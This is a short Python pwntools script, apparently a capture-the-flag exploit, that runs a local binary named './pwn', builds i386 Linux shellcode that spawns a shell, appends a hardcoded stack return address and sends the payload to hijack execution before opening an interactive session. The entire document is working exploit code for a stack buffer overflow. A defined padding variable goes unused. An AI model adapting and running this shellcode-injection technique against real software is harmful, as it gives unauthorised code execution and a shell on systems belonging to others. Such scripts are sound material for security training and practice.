from pwn import *

r = process("./pwn")

padding = (b"a"*20)
shellcode = asm(shellcraft.i386.linux.sh())
print (len(shellcode))
buf_addr = p32(0xffffcf80)
r.sendline(shellcode+buf_addr)

r.interactive()
